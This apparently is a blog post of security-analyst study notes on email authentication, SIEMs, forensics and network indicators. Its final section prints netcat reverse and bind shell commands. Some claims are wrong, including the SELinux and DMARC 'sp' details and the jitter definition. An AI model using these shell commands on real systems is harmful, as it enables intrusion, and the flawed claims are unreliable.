- **Spam:** unsolicited, bulk email messages that are sent to a large number of recipients. The messages are often commercial in nature and can be used to promote products or services, but can also be used to spread malware or phishing attempts.

- **Phishing:** type of social engineering attack that aims to trick individuals into giving away sensitive information, such as passwords or credit card numbers. These attacks are typically carried out through email or instant messaging and often involve links to fake websites or attachments that are designed to steal personal information.

- **Pretext:** a form of social engineering in which an attacker creates a false identity or scenario in order to gain access to sensitive information or resources. This can include creating a fake company or organization, or pretending to be a legitimate person or entity.

- **Spear phishing:** is a targeted form of phishing that is directed at specific individuals or organizations. This type of attack is more sophisticated than regular phishing, as the attackers will often research their target in advance in order to make the message appear more legitimate.

- **Impersonation:** is a form of social engineering in which an attacker pretends to be someone else in order to gain access to sensitive information or resources.

- **Business Email Compromise (BEC):** is a type of scam in which an attacker uses social engineering techniques to trick an employee into transferring money or sensitive information to the attacker, or to a third party. This type of scam is often directed at businesses and organizations, and is typically accomplished through spear-phishing or impersonation.

## Email Header Analysis

An email header is a collection of fields that contain information about the origin, routing, and destination of an email message. The header is typically located at the top of the email message, before the body of the message. The following are some of the most common fields found in an email header:

- **From:** this field is displayed to the recipient when they receive an email. It typically contains the name and email address of the sender that the recipient sees. This field is often used by email clients to display the sender's name in the inbox, and can be easily manipulated by attackers to make the email appear to be from a legitimate source.
- **Return Path:** also known as **Envelope From**, is the field that contains the email address that the message was sent from and that the receiving mail server uses to identify the sender. This field is used to identify the source of the email and to determine where to send delivery notifications and bounce messages. The Envelope From header is not displayed to the recipient, but it is stored in the email header as a technical information and can be visible to anyone who has access to the email header.
- **Received:** also known as the **"Received From"** or **"Received By"** header, is a field that is added to an email message as it is passed from one mail server to another. This field contains information about the routing of the message, including the IP address of the server that received the message, the date and time that the message was received, and the IP address of the server that the message was sent from.
- **Return-Path:** This field contains the email address that the message should be returned to if it cannot be delivered.
- **Received-SPF:** This field contains information about the SPF (Sender Policy Framework) check that was performed on the message.
- **Authentication-Results:** This field contains information about the authentication of the message, including the results of any DKIM (DomainKeys Identified Mail) or DMARC (Domain-based Message Authentication, Reporting & Conformance) checks that were performed.

> "X headers" refer to any header field that begins with the letter "X", followed by a hyphen. These headers are also known as "extended headers" or "non-standard headers". They are not a part of the standard email protocol (such as SMTP) but they can be added by email clients, servers or other intermediaries to provide additional information or functionality.
{: .prompt-info }

- **X-Originating-IP:** this field contains the IP address of the computer that sent the message.
- **X-Mailer:** this field contains the software that was used to compose the email message.
- **User-Agent:** this field contains information about the email client that was used to send the message.
- **MIME-Version:** this field contains the version of Multipurpose Internet Mail Extensions (MIME) that was used to format the email message.
> MIME is an extension protocol that allows emails to carry multimedia content such as images, audio, and video, as well as text in character sets other than ASCII. MIME defines a set of headers that can be used to specify the type of content in an email message, as well as how it should be displayed or handled by the recipient's email client.
{: .prompt-info }

- **Content-Type:** this field contains information about the format of the message, such as whether it is plain text or HTML.


## Email Content Analysis

An attacker could craft a malicious payload in the email to exploit the victim when opens the message. It could be a exploit inside the email body that triggers a vulnerability in the email client, or a malicious Attachment that contains malicious code when it is executed/opened. Moreover, it could contain embeded links that could redirect to a malicious webpage and exploit web vulnerabilities. 

## Email Server Security

The best way to mitigate spoofing email attacks is to configure authentication for eamil server systems. This implies using **SPF**,**DKIM** and **DMARC**. 

- **Sender Policy Framework (SPF):** An SPF record is a type of DNS (Domain Name System) record that is published in the domain's DNS zone and it specifies which mail servers are authorized to send email on behalf of that domain. When an email message is received, the receiving mail server can check the SPF record for the domain in the message's "From" address and compare it to the IP address that the message was received from. If the IP address does not match any of the authorized mail servers listed in the SPF record, the message can be rejected or flagged as potentially fraudulent.

This record states that email sent from IP addresses in the range of 192.0.2.0 to 192.0.2.255 and 198.51.100.123 are authorized to send email on behalf of **example.com**. The "~all" at the end of the record means that any email that fails the check should be marked as soft fail, which means that the email will be accepted but it could be flagged as potentially suspicious.
```
example.com. IN TXT "v=spf1 ip4:192.0.2.0/24 ip4:198.51.100.123 ~all"
```
This other example states that any server that has an IP address that matches the A or MX records for the domain example.com is authorized to send email from that domain, as well as any server that is included in the \_spf.google.com domain's SPF record (In other words, this spf record will trust the servers that the google spf record trust).
```
example.com. IN TXT "v=spf1 a mx include:_spf.google.com ~all"
```

- **Domain Keys Identified Mail (DKIM):** It allows the person receiving the email to check that it was actually sent by the domain it claims to be sent from and that it hasn't been modified during transit. In DKIM, a domain owner creates a public/private key pair and publishes the public key in the domain's DNS zone. When an email is sent from that domain, the sending server signs certain headers and the body of the email using the private key. The recipient's mail server can then retrieve the public key from the DNS zone and use it to verify the digital signature on the email (the signature contains information such as signature's algorithm, domain being claimed and the selector which is used to find the public key. If the signature is valid, it indicates that the email was sent by an authorized server for the domain and that the email has not been modified in transit.
```
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com;
    s=dkim; h=mime-version:from:date:message-id:subject:to;
    bh=1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ;
    b=1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQ
```
The fields of the signature example imply:
	- "v=1" is the version of the DKIM protocol being used.
	- "a=rsa-sha256" is the algorithm used to generate the digital signature. In this case, it is RSA with a SHA-256 hash.
	- "c=relaxed/relaxed" specifies the canonicalization algorithm used for the headers and the body of the email. "relaxed" means that the email headers and body can be modified slightly without invalidating the signature.
	- "d=example.com" is the domain being claimed by the email.
	- "s=dkim" is the selector. A selector is used to indicate which specific public key should be used to verify the signature. This allows an organization to use multiple keys for different purposes.
	- "h=mime-version:from:date:message-id:subject:to" specifies which headers were included in the signature.
	- "bh=1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" is the body hash, which is a hash of the body of the email.
	- "b=1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" is the digital signature of the email, which is generated using the private key of the domain. 

- **Domain-Based Message Authentication, Reporting and Conformance (DMARC):** This protocol works on top of **DKIM or SPF** and provides the domain owners a way to publish a policy in their DNS that specifies which mechanism(s) (SPF and/or DKIM) are used to authenticate email messages sent from their domain, and what the receiving mail servers should do if none of these mechanisms pass the check. DMARC also enables a reporting mechanism that allows the domain owner to receive feedback about the messages sent from their domain, including the number of messages that passed or failed DMARC evaluation, and the actions that receiving servers took on the messages. This allows domain owners to monitor the use of their domain and to detect any unauthorized use.

![DMARC](DMARC.jpg)

In DMARC, the alignment policy refers to the mechanism by which the domain used in the "From" address of an email message is compared to the domain used in the email's SPF (Sender Policy Framework) or DKIM (DomainKeys Identified Mail) authentication mechanisms. The goal of the alignment policy is to ensure that the domain in the "From" address is the same or a subdomain of the domain used in the authentication mechanisms.

There are two types of alignment in DMARC: relaxed and strict.
	- Relaxed alignment: In relaxed alignment, the domain used in the "From" address of the email message can be a subdomain of the domain used in the authentication mechanisms. For example, if an email is sent from "newsletter.example.com" and its SPF or DKIM authentication mechanisms are aligned with "example.com", the DMARC result is considered "aligned" (relaxed)
	- Strict alignment: In strict alignment, the domain used in the "From" address of the email message must be exactly the same as the domain used in the authentication mechanisms. For example, if an email is sent from "newsletter.example.com" and its SPF or DKIM authentication mechanisms are aligned with "newsletter.example.com", the DMARC result is considered "aligned" (strict)
```
_dmarc.example.com. IN TXT "v=DMARC1; p=quarantine; pct=25; adkim=r; aspf=s; rua=mailto:dmarc-reports@example.com; ruf=mailto:forensic-reports@example.com; sp=reject; fo=1; rf=afrf"
```
This policy specifies the following:
	- "v=DMARC1" is the version of the DMARC protocol being used.
	- "p=quarantine" specifies that email messages that fail DMARC evaluation should be quarantined (delivered to the spam or junk folder)
	- "pct=25" specifies that 25% of email messages that fail DMARC evaluation should be subject to the "p" policy. The rest will be evaluated according to the receiving server's local policy.
	- "adkim=r" is using relaxed alignment mode for DKIM, meaning that the domain used in the DKIM signature can be a subdomain of the domain in the "From" address
	- "aspf=s" is using strict alignment mode for SPF, meaning that the domain used in the SPF check must be exactly the same as the domain in the "From" address
	- "rua=mailto:dmarc-reports@example.com" specifies the email address to which aggregate reports (daily or weekly) should be sent.
	- "ruf=mailto:forensic-reports@example.com" specifies the email address to which forensic reports should be sent.
	- "sp=reject" specifies that email messages that fail SPF evaluation should be rejected.
	- "fo=1" specifies that the receiving server should generate a forensic report for any message that fails DMARC evaluation.
	- "rf=afrf" specifies the format of the forensic reports (Authentication-Results Feedback Format)

![Aligment_Policy](DMARC-aligment.png)

## SMTP Log Analysis

SMTP Logs are formatted in the reques/response way: 
- Time of request/response
- Address of the recipient
- Size of message
- Status code

Some important Satus code in SMTP are: 

| Status Code | Explanation |
| --- | --- |
| 220 | Service ready - The server is ready to accept a new message |
| 250 | Requested action completed successfully - The server has successfully completed the requested action |
| 421 | Service not available, closing transmission channel - The server is not available and is closing the connection |
| 451 | Requested action aborted: local error in processing - The server was unable to process the request due to a local error |
| 452 | Requested action not taken: insufficient system storage - The server was unable to complete the requested action because there is not enough storage space available |

## S/MIME

S/MIME (Secure/Multipurpose Internet Mail Extensions) is a security standard for email that provides encryption and digital signature capabilities to secure email messages and attachments. It uses Public Key Infrastructure (PKI) to encrypt the message with the recipient's public key and sign the message with the sender's private key, allowing the recipient to verify the authenticity of the message. S/MIME is supported by most email clients and servers and it is widely used for sensitive information such as financial transactions or confidential business information. 
It requires digital certificates that must be obtained from a certificate authority or self-signed, and both sender and receiver must have the necessary software and keys to decrypt and verify the signature.

--- 

# Configuring a SIEM 

## SIEMs
A SIEM (Security Information and Event Management) is a software system that provides real-time analysis of security-related data from various sources, such as network devices, servers, and applications. It combines security information management (SIM) and security event management (SEM) functions to provide a comprehensive view of an organization's security posture. SIEMs can be used to detect and respond to cyber threats, comply with regulatory requirements, and perform forensic investigations.

There are many comercial and open-source SIEM solutions: 

- **[Splunk](https://www.splunk.com/) :** Is one of the most used SIEM tools. The software can be installed on-premises, or used as a cloud-based service. It also provides built-in machine learning capabilities, which allow users to perform advanced analytics and detect patterns, anomalies, and trends in the data.

- **[ELK/Elastic Stack](https://www.elastic.co/es/elastic-stack/) :** This is a collection of open-source tools that provides storage, search and analysis. Combined together, they can act as a SIEM. ELK stands for Elasticsearch, Logstash, and Kibana:
	- Elasticsearch is a search engine and NoSQL database that is used to store and index data. It allows for fast searching and querying of large amounts of data.
	- Logstash is a data pipeline tool that ingests, transforms, and ships data to various destinations, including Elasticsearch. It allows for the collection, parsing, and transformation of data from various sources.
	- Kibana is a data visualization and exploration tool that runs on top of Elasticsearch. It allows for the creation of interactive dashboards and visualizations, making it easy to analyze and understand the data stored in Elasticsearch.

Beats are small, single-purpose data shippers that have a low memory and CPU footprint, making them ideal for use on resource-constrained devices, such as servers, network devices, and IoT devices. There are several different Beats available, each with a specific purpose and functionality:
	- Filebeat: Collects and ships log files
	- Packetbeat: Monitors network traffic and collects metrics on application performance
	- Metricbeat: Collects system-level metrics
	- Auditbeat: Collects and ships audit data
	- Heartbeat: Monitors uptime and availability of services
	- Winlogbeat: Collects and ships Windows event logs

![ELK](elk.png)

- **ArcSight:** A SIEM log management and analytics software that can be used for compliance reporting for legislation and regulations like HIPPA, SOX, and PCI DSS.
- **QRadar:** A SIEM log management, analytics, and compliance reporting platform created by **IBM**.
- **Alien Vault and OSSIM (Open-Source Security Information Management):** OSSIM is an open-source security information and event management (SIEM) solution. It is not developed or maintained by a specific company, but rather by a community of users and contributors. The OSSIM project was originally developed and maintained by a company called AlienVault (formerly called SELinux) but in 2019 AlienVault was acquired by AT&T Cybersecurity. So OSSIM is not maintained by AlienVault anymore but it is still available for those who want to use it.
- **Graylog:** Is another open-source SIEM with an enterprise version, more focused on compliance and supporting IT operations and DevOps. 

## Security Data Collection

When we were explaining the [Intelligence Cycle](#intelligence-cycle) in the first chapter of this post we saw the different phases that this cycle has. When using a SIEM, we can automate the Collection, Analysis and Dissemination phases. Is important to configure your alerts correctly and define propper rules to avoid false positives/negatives. 
When the SIEM reports an alert, is important to know: 
- **W**hen the event started and ended. 
- **W**ho was involved in the event (assets, users, etc.)
- **W**hat happened and the details
- **W**here did the event take place
- **W**here did the event originated from

## Data Parsing/Normalization

Data can come from numerous sourcess and formats. The SIEM can collect data in two different ways: 
- **Agent Based:** There are **agents** on each host to log, filter, aggregate and normalize data on the host and then send it to the SIEM for the analysis and storage.
- **Listener/Collector** Hosts push raw data to the SIEM (or dedicated hosts known as collectors) using protocols like syslog or SNMP and the SIEM/Collectors do the normalization of the data. 

Since data can have several formats (syslog, winlog, JSON, CSV, etc.) is important to normalize the data and formate it to facilitate the analysis. This procedure is also known as **Parsing** data. 

For example, imagine that we have this syslog data: 
```syslog
<22>Apr 20 12:34:56 hostname appname[12345]: This is a syslog message
``` 

We could have this function in python to parse this data and divide it by fields: 
```python
import re

def parse_syslog_message(syslog_message):
    # Define the regular expression pattern to match the syslog message
    pattern = r'^<(?P<priority>\d+)>(?P<timestamp>\w{3}\s+\d{1,2}\s\d{2}:\d{2}:\d{2})\s(?P<hostname>\S+)\s(?P<appname>\S+)\[(?P<pid>\d+)\]:\s(?P<message>.*)'
    match = re.match(pattern, syslog_message)
    if match:
        # Extract the structured information from the syslog message
        priority = match.group('priority')
        timestamp = match.group('timestamp')
        hostname = match.group('hostname')
        appname = match.group('appname')
        pid = match.group('pid')
        message = match.group('message')

        # Return the structured information as a dictionary
        return {
            'priority': priority,
            'timestamp': timestamp,
            'hostname': hostname,
            'appname': appname,
            'pid': pid,
            'message': message
        }
    else:
        # If the log line doesn't match the pattern, return None
        return None
```

You can add connectors or plug-ins in your SIEMS to do the parsing and correlate events. 

## Event Logs and Syslogs

Event logs are specific to the Windows operating system and are used to record information about system events, such as system startup and shutdown, security events, and application events. Event logs are organized by the type of event and are typically stored in the Windows Event Viewer. Event logs are organized into different categories, each of which corresponds to a specific type of event. The main categories of event logs include:
- System: This category includes events related to the operating system, such as system startup and shutdown, device driver events, and system-level service events.
- Security: This category includes events related to security, such as successful and failed logon attempts, and other security-related events.
- Application: This category includes events related to applications and services running on the system, such as application crashes, warnings, and errors.
- Setup: This category includes events related to the setup and installation of software and hardware on the system.
- Forwarded Events: This category includes events that have been forwarded to this computer from another source.

In addition to these categories, events are also assigned a severity level, which indicates the importance or impact of the event. The severity levels used in Windows event logs include:
- Critical: Events that indicate a significant failure or problem that requires immediate attention.
- Error: Events that indicate a problem or failure that requires attention.
- Warning: Events that indicate a potential problem or issue that should be investigated.
- Information: Events that provide information about normal or routine activities and operations.
- Verbose: Events that provide detailed information about the operation of the system or application.

Syslogs, on the other hand, are used to record information about events on a wide variety of operating systems, including Linux, Unix, and macOS. Syslogs are used to record information about system events, network events, and application events. Syslogs are typically stored in plain text files on the host system and are often used in conjunction with a syslog server or syslog collector for centralized log management. It used to run on Port 514 (UDP), but this could cause loss off packets if the network had a lot of traffic. New implementations (**syslog-ng or rsyslog**) use the port 1468 (TCP) and TLS to avoid this problem. 

The syslog message has a PRI code at the beggining of the message. A PRI (priority) code is a numerical value that is used to indicate the severity or importance of a log message. Is typically followed by the timestamp, hostname, and message text. The PRI code is represented as a decimal value that is composed of two parts: the facility code and the severity code. The facility code is a value that indicates the source or origin of the log message, such as system events, mail events, or user-level events. The severity code is a value that indicates the level of importance or urgency of the log message, such as emergency, alert, critical, error, warning, notice, or informational.

To obtain the PRI, you have to follow this formula:

**PRI = Facility * 8 + Severity**

Hence, the table with all the possible values that the PRI can take are the ones represented in this table:

| **Facilities** | **Severity** 0 | **Severity** 1 | **Severity** 2 | **Severity** 3 | **Severity** 4 | **Severity** 5 | **Severity** 6 | **Severity** 7 |
|----------|---|---|---|---|---|---|---|---|
| kernel (0) | 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 |
| user (1) | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 |
| mail (2) | 16 | 17 | 18 | 19 | 20 | 21 | 22 | 23 |
| system (3) | 24 | 25 | 26 | 27 | 28 | 29 | 30 | 31 |
| security (4) | 32 | 33 | 34 | 35 | 36 | 37 | 38 | 39 |
| syslog (5) | 40 | 41 | 42 | 43 | 44 | 45 | 46 | 47 |
| lpd (6) | 48 | 49 | 50 | 51 | 52 | 53 | 54 | 55 |
| nntp (7) | 56 | 57 | 58 | 59 | 60 | 61 | 62 | 63 |
| uucp (8) | 64 | 65 | 66 | 67 | 68 | 69 | 70 | 71 |
| time (9) | 72 | 73 | 74 | 75 | 76 | 77 | 78 | 79 |
| security (10) | 80 | 81 | 82 | 83 | 84 | 85 | 86 | 87 |
| ftpd (11) | 88 | 89 | 90 | 91 | 92 | 93 | 94 | 95 |
| ntpd (12) | 96 | 97 | 98 | 99 | 100 | 101 | 102 | 103 |
| logaudit (13) | 104 | 105 | 106 | 107 | 108 | 109 | 110 | 111 |
| logalert (14) | 112 | 113 | 114 | 115 | 116 | 117 | 118 | 119 |
| clock (15) | 120 | 121 | 122 | 123 | 124 | 125 | 126 | 127 |
| local0 (16) | 128 | 129 | 130 | 131 | 132 | 133 | 134 | 135 |
| local1 (17) | 136 | 137 | 138 | 139 | 140 | 141 | 142 | 143 |
| local2 (18) | 144 | 145 | 146 | 147 | 148 | 149 | 150 | 151 |
| local3 (19) | 152 | 153 | 154 | 155 | 156 | 157 | 158 | 159 |
| local4 (20) | 160 | 161 | 162 | 163 | 164 | 165 | 166 | 167 |
| local5 (21) | 168 | 169 | 170 | 171 | 172 | 173 | 174 | 175 |
| local6 (22) | 176 | 177 | 178 | 179 | 180 | 181 | 182 | 183 |
| local7 (23) | 184 | 185 | 186 | 187 | 188 | 189 | 190 | 191 |

## Analysis and Detection 

When using a SIEM is important to detect false positives and respond to true positives. There are different type of analisis that can be done: 
- **Conditional Analysis:** Simple form of analysis that are performed by a machine by using a signature detection and rules-based policies. This type of analysis creates large amounts of false positives and can't detect zero-day vulnerabilities. 

- **Heuristic Analysis:** A method that uses feature comparisons and likenesses rather than specific signature. This type of analysis uses machine learning to alert on behaviour tat is similar to a rule or signature. 

- **Behavioral Analysis:** A network monitoring system that detects changes in normal operating data sequences and identidies abnormal sequences. They generate an alert whenever anything deviates outsine a defined level of tolerance. 

- **Anomaly Analysis:** A network monitoring system that uses a baseline of acceptable outcomes or event patterns to identify events outside the acceptable range. It generates an alert whenever a outcome doesn't follow a set pattern or rule. 

- **Trend Analysis:** The process of detecting patterns within a dataset over time, and using those patterns to make predictions about future events or better understand past events. 
	- Frequency-based Analysis: Establishes a baseline for a metric and monitors the number of occurrences over time. 
	- Volume-based Analysis: Measures a metric based on the size of something, such as disk space or log file size. 
	- Statistical Deviation Analysis: Uses arithmetic operations to determine if a data should be treated as suspicious. 

## Regex

Most of the rules are created using **regex**. Regular expressions, also known as "regex" or "regexp," are a pattern-matching language that can be used to search, match, and manipulate text. They consist of a combination of characters, metacharacters, and special symbols that define a search pattern. You can use this webpage to learn more about it and test some regular expressions: https://regexr.com/

However, I will add a table here with the most important characters used and their explanation: 

| Character | Explanation |
|-----------|-------------|
| `.`       | Matches any single character (except newline) |
| `*`       | Matches 0 or more of the preceding character |
| `+`       | Matches 1 or more of the preceding character |
| `?`       | Matches 0 or 1 of the preceding character |
| `^`       | Matches the start of the input |
| `$`       | Matches the end of the input |
| `\b`      | Matches a word boundary (^\w|\w$|\W\w|\w\W) |
| `\d`      | Matches any digit (0-9) |
| `\w`      | Matches any word character (a-z, A-Z, 0-9, \_) |
| `\s`      | Matches any whitespace character (space, tab, newline) |
| `[abc]`   | Matches any character inside the square brackets (a, b, or c in this case) |
| `[^abc]`  | Matches any character not inside the square brackets |
| `(x|y)`   | Matches x or y |
| `{n}`     | Matches exactly n of the preceding character |
| `{n,}`    | Matches n or more of the preceding character |
| `{n,m}`   | Matches between n and m of the preceding character |
| `\`       | Escapes the next character, so it is treated as a literal |

It is also usefull to know other commands such as grep, cut, head, sort and tail as well as scripting tools such as bash scripts, Powershell, Windows Management Instrumentation Comand-Line (WMIC), Python and awk. 

---

# Digital Forensics

Digital forensics is the process of using scientific methods, techniques, and tools to identify, preserve, analyze, and present digital evidence in a manner that is legally admissible in a court of law. It is used to investigate and uncover evidence from digital devices such as computers, smartphones, servers, and other electronic media. The goal of digital forensics is to collect and preserve evidence in a way that maintains its integrity and authenticity, and to use that evidence to help solve cybercrimes such as hacking, fraud, and intellectual property theft. Additionally, digital forensics can be used in civil cases such as e-discovery and internal investigations.

## Forensic Pocedures

Is reccomended to have written procedures to ensure that the personel handling forensics proccess does it properly, efectively and in compliance with the required regulations. An overall forensic procedure should have this parts:

1. Identification: Ensure that the scene is safe, secure it to prevent evidence contamination and identify the scope of the evidence that has to be collected. 
2. Collection: Obtain the evidence (when authorization is obtained), document and prove the integrity of it.
3. Analysis: Create a image of the evidence for further analysis. When analyzing it, use repetable methods that lead to the same results.
4. Reporting: Create a report with the conclusions, methods and tools used along with the  findings. 
5. Legal Hold: This step could be the first one. It happens when the litigation is expected to occur and it imply preserving al relevant information (files, pc, emails, etc.) that could be important for the trial. 

When performing a digital forensic procedure, it is important that the analyst is not biased, the methods are repetable and the evidence must not be changed/manimulated. 

## Data Acquisition

Data acquisition are the methods and tools used to obtain and create a copy of the data from a source. In a situation where data from a system needs to be acquired, is important to bear in mind the **order of volatility**. The **order of volatility** refers to the order in which digital evidence should be collected and analyzed, with the most volatile data (data that is most likely to be lost or overwritten) being collected first and the least volatile data being collected last:
1. CPU registers and cache memory
2. Contents of system memory (RAM), routing tables, ARP cache, process table, temporary swap files
3. Data on persistent mass storage (HDD/SDD/flash drive)
4. Remote logging and monitoring data
5. Physical configuration and network topology
6. Archival media

Some tools/software used to perform this data acquisiton are described below: 

- **EnCase:** EnCase is traditionally used in Windows forensics to recover evidence from seized hard drives. It allows the investigator to conduct in-depth analysis of user files to collect evidence such as documents, pictures, internet history and Windows Registry information. 
- **The Forensic Toolkit (FTK):** FTK can be used to recover deleted files, extract data from unallocated space, and analyze images of hard drives. It also includes features for creating reports, searching for specific keywords and phrases, and creating a timeline of activity on a device.
- **The Sleuth Kit:** This other tool offers the same but is open source. 

### Memory Acquisition 

This process consists of creating a image file of the system's memory in order to store and analyze it. It allows to identify the processes that are running, the contents of temporary file systems, Registry data, network connections, cryptographic keys, and more.

- **Live Acquisition:** This acquisition is performed while the computer is running. [Memoryze](https://fireeye.market/apps/211368) and [F-Response](https://www.f-response.com/) tools can be used for this. 
- **Crash Dump:** When Windows crashes from a unrecoverable kernel error, the contents of the memory are written into a dump file. It could contain potential evidence. 
- **Hivernation File:** This file is written into the disk when a system enters a hibernation state

### Disk Image Acquisition 

This process consists of creating a image file of the system's disk in order to analyze and identify current, deleted and hidden files. 

- **Live Acquisition:** Performing a copy of the disk while the system is up and running. 
- **Static Acquisition by Shutting Down:** Capture the content when the system has been shuted down properly. Some malware can detect the shutdown process to perform anti-forensics, in this situation a Live Acquisition could be better. 
- **Static Acquisition by Pulling th Plug:** The system power will be disconnected instantly. Some data may be corrupted but malware can't detect the shutdown process. 

Is recommended to perform Live and Static Acquisition. 

- **Physical Acquisition:** Performs a bit by bit copy of a disk. Is slow but it can detect deleted files. 
- **Logical Acquisition:** It uses the file system table to detect files and copy them. Since deleted files are not referenced in the tables, can't be detected. 

A common tool used in Unix/macOS systems to perform disk image is the **dd** command. 
There are different formats that the images can have: .e01,.aff,.dd. For virtual systems, there is already a copy in vmdk (form Vmware), vhd/vhdx (for Hyper-V) and .vdi (VirtualBox) formats. 

## Timelines 
A timeline in a forensic context is a chronological representation of events that have occurred on a computer or other digital device, it can include when files were created, modified, or deleted, when emails were sent or received, and when Internet activity took place. Timeline analysis is a technique used by forensic investigators to reconstruct the events that have occurred on a device and to identify patterns of behavior, that information can be used to establish a chain of events and to identify potential suspects or victims.

To create a timeline, forensic investigators use various tools and techniques to gather data from the device, such as analyzing file system timestamps, internet history, and other metadata. This data is then organized chronologically and displayed in a format that is easy to understand and analyze.
## Carving 

When a file is deleted, what happens is that the reference of the blocks/cluster that the file was using is deleted from foe Master File Table (MFT) and thoose blocks are marked as free, however they will contain the data until they are overwritten by another file using this blocks. File Carving is the process of trying to reconstruct data that is not referenced in the MFT. 

> MFT is a data structure used by the NTFS file system to store information about files and directories on a hard drive. It is a database that contains metadata about every file and directory on an NTFS-formatted drive and it is divided into a series of fixed-size records. It is a critical part of the NTFS file system and is used by the operating system to locate and access files on the hard drive. 
{: .prompt-info}

[Scalpel](https://www.kali.org/tools/scalpel/) is an open-source tool that can be used to conduct file carving on Linux and Windows systems.


## Chain of Custody

The Chain of custody in a digital forensics context is the chronological documentation or paper trail that records the sequence of custody, control, transfer, analysis, and disposition of physical or electronic evidence. It is a process used to track the handling of evidence from the time it is collected to the time it is presented in court, it's important to establish the integrity and reliability of the evidence, ensuring that the evidence has not been tampered with or altered in any way and that the evidence is admissible in court.

---

# Analyzing Network IOCs

IOC (Indicator of Compromise) is a sign that an asset or network has been attacked/is being attacked. In this section we will analyze some IOC that can imply that our network is under attack. 

## Traffic Spikes

A traffic spike is a huge increase in connections/network traffic in comparison with a given baseline. It could be an indicator of a **Distributed Denial of Service (DDoS)**. A DDoS occurs when the attacker uses a botnet and each bot request the same service in order to overwhelm it. A DDoS attack can be measured by the number of bytes sent or the % of bandwith used. 

It can also be a **DRDoS (Distributed Reflection DoS attack)**. This attack occurs when the attacker can spoof the victim IP addres and send a lot of trafic to multiple servers, then, thoose servers will all respond to the victim IP overwhelming it. 

Is difficult to avoid a DDoS attack, but some actions can be implemented:
- Use a DDoS protection service: Many companies offer DDoS protection services that can help filter out malicious traffic before it reaches your network.
- Use a Content Delivery Network (CDN): A CDN can help distribute traffic across multiple servers, making it more difficult for an attacker to overload a single point of failure.
- Limit the amount of traffic your server can handle: By setting connection limits on your servers, you can help prevent them from becoming overwhelmed by a DDoS attack. You could use geolocation and IP reputatuon to block suspicious traffic. 
- Use firewalls and intrusion detection systems: Firewalls and intrusion detection systems can help detect and block malicious traffic.  

## Beaconing 

Beaconing is the process where a network node advertise itself to establish links with other nodes, however, it can be a technique used by malware to establish and maintain a connection with a command-and-control (C&C) server. The malware, after being installed on a target system, will periodically "phone home" to the C&C server to check for new instructions or to upload data that it has collected. This communication, or "beaconing," is typically done using a pre-defined schedule or in response to certain triggers.

## Jitter
Jittering is a technique used by malware to evade detection by making small changes to the code of the malware in each iteration, making it difficult for antivirus software to detect. This technique makes it harder for antivirus software to identify the malware by creating multiple variations of the code. Jittering can be used to evade detection by both signature-based and behavior-based antivirus software. They can also sparse de delivery to reduce the packet size and hide the connections with the C&C in the noise of the other network traffic. 

## Communication with C&C

The malwar has to connect with the C&C somehow using a communication channel. Usually, thoose chanels are: 

- **Internet Relay Chat (IRC)**  It is a form of real-time communication via the internet, consisting of various independent networks of servers that allow users to connect to channels (chat rooms) to discuss various topics or to privately message each other. The malware can also use the IRC channel to exfiltrate data from the infected system, receive updates or new modules, or to receive instructions for further malicious actions. 
- HTTP and HTTPs
- DNS
- Social Media Websites
- Cloud Services
- Media and Document Files

## Irregular Peer to Peer Communications
Unusual P2P protocols: If a system or network is using P2P protocols that are not typically used, or that are not authorized, this could indicate that malware or a malicious actor is using these protocols for C&C (Command and Control) or data exfiltration, for example SMB protocol. 

## Rogue Devices

**ARP (Address Resolution Protocol) spoofing** is a type of attack in which an attacker sends fake ARP messages to a LAN (Local Area Network) in order to map an attacker's MAC address to the IP address of another device on the network. ARP is a protocol used to map a network address (such as an IP address) to a physical address (such as a MAC address). When a device on a LAN wants to communicate with another device, it sends an ARP request to find the MAC address associated with a particular IP address.

**Network Taps** can also be considered Rogue Devices. They are physical devices attached to cabling in order to record packets. 

A way to avoid this devices is to conduct network mapping and host discovery ensuring that everithing is within your scope. Is recommended to use certificates to ensure that the communications are encrypted and can help to detect a rogue device. 

## Scans abd Sweeps

Port Scans, Fingerprinting, Sweeps and Footprinting are indicators that someone is analyzing the network searching for vulnerable services and open ports. 
- **Port Scan:** is a technique used to identify UDP/TCP open ports on a target system.
- **Fingerprinting:** is a technique used to identify the operating system, software, and other characteristics of a target system.
- **Sweeping:** is a technique used to identify live systems on a network.
- **Footrpinting:** is the process of gathering information about a target system or network.


## Nonstandard Port Usage

System ports are classified into: 
- **Well-known ports:** Ports 0 to 1023
- **Registered Ports:** Ports 1024 to 49151
- **Dynamic ports:** Ports 49152 to 65535

Standard services will use well knwon and registered ports. The dynamic ports are randomly used by applications to start connections, but if the same port appears to be constantly open, it could indicate a malicious traffic chanel. Another IOC would be a standard protocol not using the standard port, for example DNS not using the port 53. 

A easy mitigation is to configure the Firewall allowing only whitelisted ports for egress and ingress interfaces, and document what kind of ports are allowed on each host type. 

## Reverse and Bind Shells

Attackers will attempt to obtain remote access to run commands on the target system. 

A bind shell is a type of shell that runs on the target system and binds to a specific port, listening for incoming connections. A reverse shell, on the other hand, runs on the attacker's system and connects back to the attacker's system after the target system has been compromised. In summary, a bind shell listens for incoming connections while a reverse shell connects back to the attacker.
A reverse shell is used to exploit organizations that have not configured outbound traffic filtering at the firewall

![Bind and Reverse Shell](bindreverse.png)

The "netcat" utility can be used to establish this shells. 

To create a reverse shell with netcat, we would use this commands: 
```bash
#on the attacker machine we set up the listener on port 4444
nc âlvp 4444

#on the victim machine, we stablish the conection with the attacher ip and port 4444,  redirecting /bin/bash to that port
nc 192.168.100.113 4444 âe /bin/bash
```

However, for creating a bind shell, the commands are different: 
```bash
#on the victim machine we set up the listener on port 4444
nc -lvp 4444 -e /bin/bash

#on the attacker machine, we establish a connection with the victim's ip and the port 4444
nc 192.168.1.2 4444
```

Here is a list of well known TCP ports and the protocols/applications they run. 

| Port | Protocol | Description |
|------|----------|-------------|
| 21   | FTP      | File Transfer Protocol |
| 22   | SSH/SFTP | Secure Shell/FTP over SSH |
| 23   | TELNET   | Telnet - an unsecure remote administration interface |
| 25   | SMTP     | Simple Mail Transfer Protocol |
